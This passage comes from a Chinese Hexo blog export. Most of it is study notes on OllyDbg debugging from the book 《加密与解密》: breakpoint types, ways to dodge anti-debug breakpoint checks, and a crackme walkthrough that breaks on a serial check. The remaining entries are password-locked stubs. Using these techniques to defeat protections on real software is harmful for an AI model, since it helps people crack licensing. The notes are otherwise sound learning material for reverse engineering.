<li><p>Linux：【<a href="https://blog.csdn.net/Arlingtonroad/article/details/107148527?ops_request_misc=&request_id=&biz_id=102&utm_term=%E8%BF%9B%E7%A8%8B%E5%9C%B0%E5%9D%80%E7%A9%BA%E9%97%B4%E5%88%86%E5%B8%83%E5%92%8C%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E5%88%86%E5%B8%83&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-6-.nonecase&spm=1018.2226.3001.4187">进程虚拟地址空间的分布详解</a>】、<a href="https://www.cnblogs.com/zszmhd/archive/2012/08/29/2661461.html">Linux内存寻址和内存管理</a>、【《CS：APP》】、【<a href="https://cloud.tencent.com/developer/article/1624718">Linux可执行文件与进程的虚拟地址空间</a>】</p>
</li>
</ul>
<div class="note danger"><p>程序使用的虚拟地址：</p>
<p>①当一个应用程序启动时，操作系统就创建一个进程，并给该进程分配 2GB 的虚拟地址（不是内存，只是地址）；</p>
<p>②虚拟内存管理器将应用程序的代码映射到那个应用程序的虚拟地址中的某个位置，并把当前需要的代码读入物理地址（注意：虚拟地址与应用程序代码在物理内存中的位置是没有关系的）。</p>
<p>③如果使用 DLL，DLL 也会被映射到进程的虚拟地址空间中，在需要的时候才会被读入物理内存。</p>
<p>④其他项目（数据、堆等）的空间是从物理内存中分配的，并被映射到虚拟地址空间中。</p>
<p>⑤应用程序通过使用其虚拟地址空间中的地址开始执行。然后，虚拟内存管理器把每次内存访问映射到物理位置。</p>
</div>

<p>总结为以下几点：</p>
<ol>
<li>应用程序不会直接访问物理地址。</li>
<li>虚拟内存管理器通过虚拟地址的访问请求来控制所有的物理地址访问。</li>
<li>每个应用程序都有独立的 4B 寻址空间，不同应用程序的地址空间是彼此隔离的。</li>
<li>DLL 程序没有“私有”空间，它们总是被映射到其他应用程序的地址空间中，作为其他应</li>
</ol>
<p>用程序的一部分运行。其原因是：如果 DLL 不与其他程序处于同一个地址空间，应用程序</p>
<p>64 位 Windows 操作系统提供了 <strong>16TB</strong> 的有效寻址空间，其中的一半可用于用户模式的应用程序。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>《加密与解密》_2_动态调试技术_OllyDbg</title>
    <url>/post/encryption-and-cracking-2-ollydbg/</url>
    <content><![CDATA[<p>⍢⃝  ⍤⃝ ⍥⃝ ⍨⃝ ⌓̈⃝ ◡̈⃝  ⠒̫⃝  ʚ◡̈⃝ɞ  ༛̥⃝ʺ̤ </p>
<span id="more"></span>

<h2 id="动态分析技术"><a href="#动态分析技术" class="headerlink" title="动态分析技术"></a>动态分析技术</h2><div class="note danger"><p>动态调试器：</p>
<ul>
<li><mark class="label default">用户模式</mark>：工作在Ring3。<ul>
<li>OllyDbg、x64dbg、MDebug、Visual C++等。</li>
</ul>
</li>
<li><mark class="label default">内核模式</mark>：工作在Ring0，操作系统内核调试器。<ul>
<li>WinDbg</li>
</ul>
</li>
</ul>
</div>

<h3 id="1-调试窗口"><a href="#1-调试窗口" class="headerlink" title="1 调试窗口"></a>1 调试窗口</h3><p>OllyDbg的5个窗口：</p>
<p><img data-src="https://i.loli.net/2021/07/26/qR17DOSweKpa9k5.png" alt="1.png"></p>
<p>详细可查看<a href="https://blog.csdn.net/qq_40591440/article/details/110090789">《OD窗口介绍》</a></p>
<ol>
<li><p><strong>反汇编窗口</strong>：</p>
<ul>
<li><strong>Address</strong> 列：显示被双击行地址的相对地址，再次双击返回标准地址模式（栈区也可双击地址）。虚拟地址，<mark class="label warning">在一般情况下，同一程序的同一条指令在不同系统环境下此值相同</mark>。</li>
<li><strong>Hex dump</strong> 列：设置或取消无条件断点，快捷键：<mark class="label success">F2</mark>键。</li>
<li><strong>Disassembly</strong> 列：调用汇编器，可直接修改汇编代码，快捷键：空格键。</li>
<li><strong>Comment</strong> 列：允许增加或编辑注释，快捷键：<mark class="label success">；</mark>键。</li>
</ul>
</li>
<li><p><strong>信息窗口</strong>：在进行动态跟踪时，信息面板窗口（Information window）将显示以下等信息：</p>
<ul>
<li>寄存器的值；</li>
<li>API 函数调用提示；</li>
<li>跳转提示。</li>
</ul>
</li>
<li><p><strong>数据窗口</strong>：以<strong>十六进制</strong>和<strong>字符方式</strong>显示<strong>文件在内存中的数据</strong>。可使用数据窗口跟随或在数据窗口按“<code>Ctl+G”</code>快捷键，打开地址窗口，输入地址。</p>
</li>
<li><p><strong>寄存器窗口</strong>：显示 CPU 各寄存器的值，支持浮点、MMX 和 3DNow!寄存器。可以单击右键或窗口标题切换显示寄存器的方式。修改寄存器的值可直接双击（EIP除外）。EIP寄存器，不能直接修改，需要在反汇编窗口选择新的指令起始地址，在弹出的快捷菜单中选择“New origin here”（此处为新的EIP）。</p>
</li>
<li><p><strong>栈面板窗口</strong>：显示栈的内容。栈窗口非常重要，各 API 函数和子程序都利用它传递参数和变量等。</p>
</li>
</ol>
<ul>
<li>OD所在目录下的UDD 文件是 Ollydbg 的工程文件，用于保存当前调试的一些状态，例如断点、注释等，以</li>
</ul>
<p>便下次调试时继续使用。</p>
<ul>
<li>插件用于扩充功能。路径设置正确后，将插件复制到<code>plugin</code>目录里，相应的选项就会在Ollydbg 的主菜单<code>Plugin</code>（插件）里显示出来。</li>
</ul>
<h3 id="2-基本操作"><a href="#2-基本操作" class="headerlink" title="2 基本操作"></a>2 基本操作</h3><p>大部分程序在启动时都会停在<mark class="label default">入口点</mark>（EntryPoint）。通过一些特殊的修改方式，有些程序可以在启动时不停在入口点，以达到反调试的目的。</p>
<p>快捷键：</p>
<p><img data-src="https://i.loli.net/2021/08/23/EtGb4fwe2kzgiRx.png" alt="2.png"></p>
<p>Call的跟进与回退查看：</p>
<ul>
<li>按<code>F7</code>进入子程序的过程后，若想回看之前单步跟踪的代码，可以按<mark class="label success">-</mark>（减号）键。（除了反汇编窗口中能会退看之前的代码外，其余窗口数据不会变化）；</li>
<li>若想让光标回到当前EIP所指向的语句，可以单击快捷窗口<strong>C</strong>按钮或双击EIP寄存器。</li>
</ul>
<mark class="label danger">OllyDbg对API的大小写敏感，输入的函数名大小写必须正确。</mark>



<p>通过屏蔽程序的某些功能或改变程序流程使程序保护方式失效的方法称为“爆破”。</p>
<p>代码分析：</p>
<ul>
<li>如<code>mov bl,[eax+405030]</code>：若eax每次自增<code>inc</code>或自减<code>dec</code>，则<code>0x405030</code>有很大可能是一个数组集合，构成两个循环自变量，<code>0x405030</code>为大循环自变量。</li>
<li>函数<code>wsprintf()</code>是唯一需要需要手动平衡栈的API函数。</li>
</ul>
<h3 id="3-常用断点"><a href="#3-常用断点" class="headerlink" title="3 常用断点"></a>3 常用断点</h3><p>常用的断点有：</p>
<ul>
<li><mark class="label default">INT3 断点</mark></li>
<li><mark class="label default">硬件断点</mark></li>
<li><mark class="label default">内存断点</mark></li>
<li><mark class="label default">消息断点 ...</mark></li>
</ul>
<h4 id="3-1-INT-3-断点"><a href="#3-1-INT-3-断点" class="headerlink" title="3.1 INT 3 断点"></a>3.1 INT 3 断点</h4><p>在Ollydbg中可以使用如下快捷键来设置&#x2F;取消断点：</p>
<ul>
<li><mark class="label warning">bp</mark></li>
<li><mark class="label warning">F2</mark></li>
</ul>
<p>原理：当执行一个 INT3 断点时，该地址处的<strong>机器码</strong>被调试器用 INT3 指令替换了，此时 Ollydbg 将 INT3 隐藏，显示出来的仍是中断前的指令。如在<code>004013A5h</code>处设置int3 断点，则该地址处的机器码被替换成<code>CC</code>，当<code>CC</code>执行完之后，再去执行该地址处的指令。</p>
<div class="note danger"><p>这个 INT 3 指令，因其机器码是<code>0xCC</code>，也常被称为<mark class="label danger">CC 指令</mark>，故一般缓冲区经常填充为<strong>C</strong>。</p>
</div>



<div class="note primary"><p>使用上的一些技巧：</p>
<p>一些软件会对自身较为敏感的API函数进行检测，为了防范 API 被下断，一些软件会检测 API 的<strong>首地址</strong>是否为<code>0xCC</code>（以此判断是否被下断）。</p>
<p>技巧：躲过检测的方法是将断点设在函数<mark class="label danger">内部或末尾</mark>，例如将断点设在函数入口的下一行等。</p>
</div>



<h4 id="3-2-硬件断点"><a href="#3-2-硬件断点" class="headerlink" title="3.2 硬件断点"></a>3.2 硬件断点</h4><div class="note success"><p>硬件断点优势：</p>
<ol>
<li>INT 3 断点容易被检测到；</li>
<li>硬件断点执行速度快。</li>
</ol>
<p>缺点：最多只能使用 4 个断点。</p>
<p>硬件断点可以在代码区、数据区下断点。<strong>在数据区下断点也可以实现与内存断点相同的效果</strong>。</p>
</div>

<p>硬件断点和<mark class="label success">DRx</mark>调试寄存器有关。在 Intel CPU 体系架构手册中可以找到对 DRx 调试寄存器的介绍，如图 2.24 所示。</p>
<p><img data-src="https://i.loli.net/2021/08/19/dXzH9fIEmYJL7BP.png" alt="3.png"></p>
<p>DRx 调试寄存器共有 8 个（DRO~DR7），每个寄存器的特性如下。</p>
<ul>
<li>DR0~DR3：调试地址寄存器，用于保存需要监视的地址，例如设置硬件断点。</li>
<li>DR4~DR5：保留，未公开具体作用。</li>
<li>DR6：调试寄存器组<strong>状态</strong>寄存器。</li>
<li>DR7：调试寄存器组<strong>控制</strong>寄存器。</li>
</ul>
<p>硬件断点的原理是使用 DRO、DR1、DR2、DR3 <strong>设定地址</strong>，并使用 DR7 设定相应的控制位，因此<mark class="label success">最多设置 4 个断点</mark> 。硬件执行断点与<code>CC</code>断点的作用一样，但因为硬件执行断点不会将指令首字节修改为<code>CC</code>，所以更难检测。</p>
<div class="note success"><p><strong>硬件断点设断方法：</strong></p>
<ul>
<li>在指定的代码行单击右键，执行快捷菜单中的“Breakpoint” →”Hardware, on execution”（“断点”→“硬件执行”）命令。</li>
<li><mark class="label warning">HE</mark>地址。</li>
</ul>
<p><strong>硬件断点删除方法：</strong></p>
<ul>
<li>单击菜单栏“调试”→”硬件断点”；</li>
<li>在有硬件断点的地址处右键删除硬件断点。</li>
</ul>
</div>

<p>硬件断点的运用：Ollydbg 提供了一个快捷键<mark class="label warning">F4</mark>，可以执行到光标所在的行。这也是利用调试寄存器的原理 --- 在中断后自动删除，相当于执行了一次性硬件断点。</p>
<p>硬件断点的优点是速度快，在 INT 3 断点容易被发现的地方使用硬件断点会有很好的效果，缺点是最多只能使用 4 个断点。</p>
<h4 id="3-3-内存断点"><a href="#3-3-内存断点" class="headerlink" title="3.3 内存断点"></a>3.3 内存断点</h4><div class="note danger"><p>内存断点：只能下<mark class="label default">1</mark>个内存断点。</p>
<ul>
<li>内存访问断点；“断点”→“内存访问”&#x2F;“删除内存断点”）</li>
<li>内存写入断点。（“断点”→“内存写入”&#x2F;“删除内存断点”）</li>
</ul>
</div>

<div class="note warning"><p>内存断点与<code>INT 3</code>断点的区别：</p>
<p>内存断点<strong>不修改原始代码</strong>，不会像 INT3 断点那样因为修改代码被程序校验而导致下断失败。因此，<strong>在遇到代码校验且硬件断点失灵的情况下，可以使用内存断点</strong>。</p>
</div>

<p>Ollydbg可以设置内存访问断点或内存写断点。</p>
<p>原理：对所设的地址赋予<strong>不可访&#x2F;不可写</strong>属性，这样当访问&#x2F;写的时候就会产生异常。Ollydbg 截获异常后，比较异常地址是不是断点地址，如果是就中断，让用户继续操作。</p>
<p>程序运行时有 3 种状态，分别是读取、写入和执行（被CPU执行）。写入和读取的示例代码如下</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mov dword ptr ds:[<span class="number">405528</span>], edx   ;对【<span class="number">405528</span>] 处的内存进行写入</span><br><span class="line">mov edx, dword ptr ds:[<span class="number">405528</span>]   ;对【<span class="number">405528</span>] 处的内存进行读取</span><br></pre></td></tr></table></figure>

<p><strong>硬件断点与内存断点：</strong></p>
<p>硬件断点在<mark class="label info">数据区</mark>下断也可以实现与内存断点相同的效果。单个硬件写入访问断点可以设置为 1 字节、2 字节或 4 字节，而且不论选择的数据范围有多大，只有前 4 个字节会起作用。</p>
<div class="note danger"><p><mark class="label primary"><strong>硬件访问&#x2F;写入断点是在触发硬件断点的下一条指令处下断，而内存断点是在触发断点的指令处下断。</strong></mark></p>
</div>



<h4 id="3-4-内存访问一次性断点"><a href="#3-4-内存访问一次性断点" class="headerlink" title="3.4 内存访问一次性断点"></a>3.4 内存访问一次性断点</h4><p>该类型的断点是一次性的，它可以对内存块的整个段下断点。由于Windows使用段页式的内存管理方法，每个段都有不可访问、读、写、执行的属性，如果对某一个区块下断点之后，当这个区块被访问或者执行时就会中断。</p>
<p>简称为<mark class="label info">段断点</mark>，在脱壳时捕捉调用或返回某个模块很有用。</p>
<p>使用方法：</p>
<ul>
<li>在OD里按<code>Alt+M</code>&#x2F;快捷按钮<strong>M</strong>→在相应的段上单击右键→在访问上设置断点（Set break-on-access）</li>
</ul>
<div class="note default"><p>段断点与内存断点是有区别的，段断点（<mark class="label success">在访问上设置中断</mark>）是一次性的，而内存断点不是一次性的。</p>
</div>



<h4 id="3-5-消息断点"><a href="#3-5-消息断点" class="headerlink" title="3.5 消息断点"></a>3.5 消息断点</h4><p>Windows 本身是由消息驱动的，<strong>如果调试时没有合适的断点，可以尝试使用消息断点</strong>。当某个特定窗口函数接收到某个特定消息时，消息断点将使程序中断。</p>
<div class="note danger"><p>消息断点与 INT 3 断点的区别在于：INT 3 断点可以在程序启动之前设置，消息断点<strong>只有在窗口被创建之后</strong>才能被设置并拦截消息。</p>
</div>

<p>当用户单击一个按钮、移动光标或者向文本框中输入文字时（一个事件），一条消息就会发送给当前窗体。所有发送的消息都有 4 个参数，分别是 1 个窗口句柄（hwnd）、1 个消息编号（msg）和 2 个 32 位长（long）的参数。<mark class="label warning">Windows 通过句柄来标识它所代表的对象</mark>。例如，在单击某个按钮时，Windows 通过句柄来判断单击了哪一个按钮，然后发送相应的消息来通知程序。</p>
<p>事件→发送消息（4个参数）→当前窗体。</p>
<p>举例：</p>
<ol>
<li><p>将TraceMe.exe程序拖进OllyDbg → 点击<strong>W</strong>或输入<code>Alt+W</code>打开“窗口”（实时显示窗口上相关信息包括按钮、文本输入框的相关信息的重要参数） → 右键刷新，无任何内容，因为窗口还没有被创建；</p>
<p><img data-src="https://i.loli.net/2021/08/21/8WQBH5EFrLjfuPv.png" alt="4.png"> </p>
</li>
<li><p>F9运行，出现窗口 → 打开“窗口” → 右键刷新；</p>
<p><img data-src="https://i.loli.net/2021/08/21/t2URLcf1aFY7q8u.png" alt="5.png"></p>
</li>
<li><p>对“Check”按钮下断点，即当单击该按钮时程序中断。在“Check”条目上单击右键 → 在“ClassProc”上设置消息断点 → 选择消息类型。有文本控件、按钮、鼠标等类型的消息。如果选择第 1 项“Any Message“，将拦截所有消息。我们在这里关注的消息属于“Button”（按钮）这一项，当单击按钮并松开时，会发送“WM_LBUTTONUP“这个消息。单击下拉菜单，选择“202  WM_LBUMTONUP”选项，再单击“OK”按钮，消息断点就设置好了。</p>
<p><img data-src="https://i.loli.net/2021/08/20/37tQXKnsN5FYzJI.png" alt="6.png"></p>
</li>
<li><p>输入用户名、序列号后消息断点将程序断在系统领空，但是按<code>Ctrl+F9</code>（运行到<code>ret</code>）或<code>Alt+F9</code>（返回到程序领空）或<code>F9</code>都不管用，则需要设置<mark class="label danger">段断点</mark>（<mark class="label default">在访问上设置中断</mark>，一次性断点）来让程序返回到程序领空并断下来。</p>
<p><img data-src="https://i.loli.net/2021/08/20/nWeoHv8ctbjkzw7.png" alt="7.png"></p>
</li>
<li><p>点击运行<code>/F9</code>，程序断在程序领空。</p>
<p><img data-src="https://i.loli.net/2021/08/20/nAedLriyp16FNwg.png" alt="8.png"></p>
</li>
</ol>
<h4 id="3-6-条件断点"><a href="#3-6-条件断点" class="headerlink" title="3.6 条件断点"></a>3.6 条件断点</h4><p>条件断点会在满足一定条件时才会中断，这类断点称为条件断点。OllyDbg的条件断点可以按<mark class="label info">寄存器</mark><mark class="label warning">存储器</mark><mark class="label default">消息</mark>等设断。条件断点是一个带有条件表达式的普通INT 3断点。当调试器遇到这类断点时，断点将计算表达式的值，如果结果非零或者表达式有效，则断点生效（暂停被调试程序）。</p>
<div class="note success"><p>如循环、数组等场景中使用起来分析很方便。</p>
</div>



<p>（1）按寄存器条件中断</p>
<ul>
<li>快捷键：<mark class="label info">Shift+F2</mark></li>
<li>CmdBar：<mark class="label warning">bp 0x40XXXXXX EAX==？？</mark></li>
</ul>
<p>（2）按存储器条件中断</p>
<p>在实际应用中程序可能会成百上千次调用<code>CreateFileA</code>函数，因此让OllyDbg在<code>CreateFileA</code>函数打开所需文件时中断就显得十分有必要了。CreateFile函数的定义如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	LPCTSTR lpFileName,                         <span class="comment">//指向文件名的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwDesiredAccess,                      <span class="comment">//访问模式</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwShareMode,                          <span class="comment">//共享模式</span></span></span></span><br><span class="line"><span class="function"><span class="params">	LPSECURITY_ATTRIBUTES lpSecurityAttributesr <span class="comment">//指向安全属性的指针</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwCreationDistribution,               <span class="comment">//如何创建文件</span></span></span></span><br><span class="line"><span class="function"><span class="params">	DWORD dwFlagsAndAttributes,                 <span class="comment">//文件属性</span></span></span></span><br><span class="line"><span class="function"><span class="params">	HANDLE hTemplateFile                        <span class="comment">//用于复制文件句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p><img data-src="https://i.loli.net/2021/08/22/FwNKZrcsze9y5kA.png" alt="9.png"></p>
<h4 id="3-7-条件记录断点"><a href="#3-7-条件记录断点" class="headerlink" title="3.7 条件记录断点"></a>3.7 条件记录断点</h4><p>条件记录断点除了具有条件断点的作用，还能<strong>记录断点处函数表达式或参数的值</strong>。也可以设置通过断点的次数，每次符合暂停条件时，计数器的值都将减1。</p>
<p>快捷键：<mark class="label warning">Shift+F4</mark></p>
<p><img data-src="https://i.loli.net/2021/08/22/J1jn2ZT7Rs4Yumx.png" alt="10.png"></p>
<ul>
<li>①在“Condition：（条件）域中输入要设置的条件表达式。如<code>[STRING [esp+4]]==&quot;c:\\1212.txt&quot;</code>。</li>
<li>②在“Explanation”（说明）域中设置一个名称（自定义）。</li>
<li>③“Expression”（表达式）域中是要记录的内容的条件，<strong>只能设置1个表达式</strong>，例如要记录EAX的值，可以输入“EAX”。</li>
<li>④在“Decode value of expression as”（解码表达式的值）下拉列表中可以对记录的数据进行分析。例如，在条件记录窗口中，如果“Expression”域中填写的是 “【esp+4】”，则要在该下拉列表中选择“Pointer to ASCII String”（指向ASCII字符串的指针）选项，才能得到正确的结果，其功能相当于“STRING”前缀。</li>
<li>⑤对这3个域，可以根据需要设置“Never”（从不）、“On condition”（按条件）或“Always”（永远）。<ul>
<li>“Pause program”（暂停程序）域用于设置OllyDbg遇到断点时是否中断。</li>
<li>“Log value of expression”（记录表达式的值）域用于设置遇到断点时是否记录表达式的值。</li>
<li>“Log function arguments”（记录函数参数）域用于设置遇到断点时是否记录函数的参数。</li>
</ul>
</li>
<li>⑥通过断点的次数。</li>
<li>⑦条件记录断点允许向插件传递1个或多个命令。当应用程序因条件断点暂停，并且断点中包含传递给插件的命令时，都会调用回调函数<code>ODBG_Plugincmd(int reason，t_reg *registers,char *cmd)</code>。例如，当程序暂停时，传送命令<code>d esp</code>给CmdBar插件，只要在如图⑦窗口的文本框中输入<code>.d esp</code>（注意，命令前有一个点字符 <code>.</code>），当条件断点断下时，就会执行“desp”命令。这时，我们就可以在数据窗口中看到ESP地址处的数据了。</li>
<li>⑧设置好条件记录断点，单击实例Conditional_bp的“OpenTest”按钮，运行后，OllyDbg会在“Logdata”窗口（快捷键<code>Alt+L</code>）记录数据，如图⑧所示。</li>
</ul>
<h3 id="4-插件"><a href="#4-插件" class="headerlink" title="4 插件"></a>4 插件</h3><p>将插件复制到Plugin这个目录下，重新运行OllyDbg，就可以加载插件了。由于0llyDbg默认只能加载32个插件，而且插件之间有可能存在冲突，建议在插件目录下仅放置常用的插件，以减少各类问题的出现。</p>
<p>常用插件：</p>
<ul>
<li>命令行插件CmdBar如下图。</li>
<li>OllyScript插件：OllyDbg的脚本插件可以通过OllyScript脚本完成一些复杂的或重复性的操作，具体使用方法可参考其帮助文档。</li>
</ul>
<p><img data-src="https://i.loli.net/2021/08/23/HnkhF3DNGpL1CK7.png" alt="11.png"></p>
<h3 id="5-Run-trace"><a href="#5-Run-trace" class="headerlink" title="5 Run trace"></a>5 Run trace</h3><p>Run trace （Run跟踪）可以把<mark class="label primary">被调试程序执行过的指令保存下来</mark>，以便了解以前发生的事件。该功能将地址、寄存器的内容、消息等记录到Run trace缓冲区中。</p>
<p>-待补充-</p>
<h3 id="6-Hit-trace"><a href="#6-Hit-trace" class="headerlink" title="6 Hit trace"></a>6 Hit trace</h3><p>Hit trace能够让调试者<mark class="label success">辨别</mark><mark class="label warning">哪一部分代码被执行了，</mark><mark class="label default">哪一部分没有。</mark></p>
<p><strong>原理</strong>：在选中区域的每一条命令处设置一个INT 3断点，当中断发生时，OllyDbg便把它去除。<strong>在使用Hit trace时，不能在数据中设置断点，否则程序可能会崩溃</strong>。如下图。</p>
<p><strong>使用方法</strong>：当遇到一段跳转分支比较多的代码，需要了解程序的执行线路时，可以使用Hit trace。</p>
<ul>
<li>选中这段代码 → 单击右键快捷菜单中的“Hit trace”（Hit 跟踪）→ “Add selection”（添加选择部分）命令，将需要监视的代码选中 → 然后按“F9”键让程序运行，OllyDbg就会在已被执行的指令前用不同的颜色添加标记。</li>
<li>注意：如果右键快捷菜单中没有Hit trace的相关命令，则必须打开相关的菜单选项进行代码分析。例如，可以按“Ctrl+A”快捷键或执行右键快捷菜单中的“Analysis”一“Analyse code”（“分析”十“分析代码”）命令重新分析代码。</li>
</ul>
<h3 id="7-Ollydbg常见问题"><a href="#7-Ollydbg常见问题" class="headerlink" title="7 Ollydbg常见问题"></a>7 Ollydbg常见问题</h3><table>
<thead>
<tr>
<th align="center">常见问题</th>
<th align="left">快捷键</th>
<th align="left">原因分析及解决方法</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>乱码问题</strong></td>
<td align="left">◡̈⃝： Ctrl+A<br />◡̈⃝： “Analysis” → “Analyse code”（“分析” → “分析代码”）<br />◡̈⃝：“Analysis” → “Remove analysis from module”（“分析” → “从模块中删除分析”）</td>
<td align="left"><strong>原因</strong>：这是因为OllyDbg将这段代码当成了数据，没有进行反汇编识别。<br /><strong>解决方法</strong>：此时，只要执行0llyDbg右键快捷菜单中的“Analysis” → “Analyse code”（“分析” → “分析代码”）命令或按“Ctrl+A”快捷键，强迫OllyDbg重新分析代码即可。如果还是无法识别，可以尝试执行右键快捷菜单中的“Analysis” → “Remove analysis from module”（“分析” → “从模块中删除分析”）命令或在UDD目录中删除相应的UDD文件。</td>
</tr>
<tr>
<td align="center"><strong>快速回到当前程序领空</strong></td>
<td align="left">◡̈⃝：双击寄存器面板中的EIP<br />◡̈⃝：单击如下按钮。<img data-src="https://i.loli.net/2021/08/23/3s7wcCalLW4gih5.png" alt="12"></td>
<td align="left"><strong>原因</strong>：在OllyDbg中查看代码时可能会翻页或者定位到其他地方。<br /><strong>解决方法</strong>：如果想快速回到当前CPU所在的指令处，可以双击寄存器面板中的EIP或单击<strong>C</strong>按钮。</td>
</tr>
<tr>
<td align="center">OllyDbg修改EIP</td>
<td align="left">◡̈⃝：Ctrl+*<br />◡̈⃝：右键 → “New origin here”（在此处新建EIP）</td>
<td align="left"><strong>原因</strong>：修改EIP。<br /><strong>解决方法</strong>：将光标移到需要修改的地址上，执行右键快捷菜单中的“New origin here”（在此处新建EIP）命令或使用快捷键<code>Ctrl+*</code>即可修改EIP。</td>
</tr>
<tr>
<td align="center">UDD</td>
<td align="left">◡̈⃝：查看程序目录udd文件夹</td>
<td align="left"><strong>原因</strong>：清除调试痕迹。<br /><strong>解决方法</strong>：OllyDbg把所有与程序或模块相关的信息保存在单独的文件中，以便在模块重新加载时继续使用。这些信息包括标签、注释、断点、监视、分析数据、条件等。</td>
</tr>
<tr>
<td align="center">已经删除了断点，llyDbg重新加载时这些断点重新出现</td>
<td align="left">◡̈⃝：修改<code>ollydbg.ini</code></td>
<td align="left">将配置文件<code>ollydbg.ini</code>中的相应内容改成<code>Backup UDD files=1</code>即可解决。</td>
</tr>
<tr>
<td align="center">OllyDbg出现“假死”现象</td>
<td align="left">◡̈⃝：修改<code>ollydbg.ini</code></td>
<td align="left">用OllyDbg调试一些加壳程序，程序运行到断点（包括硬件断点）时，OllyDbg会出现“假死”现象。解决方法是：打开配置文件<code>ollydbg.ini</code>，如果<code>Restore windows</code>是一个很大的值，就设置<code>Restore windows 0</code>。</td>
</tr>
<tr>
<td align="center">微调窗口显示</td>
<td align="left">◡̈⃝：Crl+↑<br />◡̈⃝：Ctrl+↓</td>
<td align="left">可以通过“Crl+↑”或“Ctrl+↓”快捷键对反汇编窗口或数据窗口翻动1字节。</td>
</tr>
<tr>
<td align="center">执行复制到可执行文件时，提示错误信息“Unable to locate data in executable file”</td>
<td align="left">◡̈⃝：修改<code>RawSize =VirtualSize</code></td>
<td align="left">这里要修改的地方不在RawSize范围内。修改PE文件，使“RawSize &#x3D;VirtualSize”，具体方法参见第11章。<br />或者添加的代码所在区段属性不是<code>CODE/TEXT</code></td>
</tr>
<tr>
<td align="center">把call调用改成函数名的形式</td>
<td align="left">◡̈⃝：Shift+;</td>
<td align="left">例如<code>call 401496</code>，假设<code>401496h</code>处是<code>amsg_exit</code>函数，将光标停在该处，按<code>Shift+;</code>快捷键，会弹出一个标签框，在其中输入字符<code>amsg_exit</code>，所有调用<code>401496h</code>处的call指令都会变成<code>call &lt;amsg_exit&gt;</code>的形式。</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>笔记</category>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>C/C++ 语言内存管理</title>
    <url>/post/memory-management/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ce3c8b26bcd30b2c08cc0b8ba2507963ff38d48d8e0db0f6a76c629f04faa47e"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>C-Memory</tag>
        <tag>内存管理</tag>
      </tags>
  </entry>
  <entry>
    <title>C/C++ Memory Application</title>
    <url>/post/memory/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="680105f66054cab07d85d8de010157ab1609157627efdf5a39a7faf8bd2c5c6b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>C&amp;C++</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>C-Memory</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs</title>
    <url>/post/sqli-labs/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="46e6e181a9c5323e10d93a611817bfc14308d86fd1c438a52778e197b93818dc"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 安全防护指南基础篇-SQL注入</title>
    <url>/post/web-basic-safety-guide-sqlinject/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>



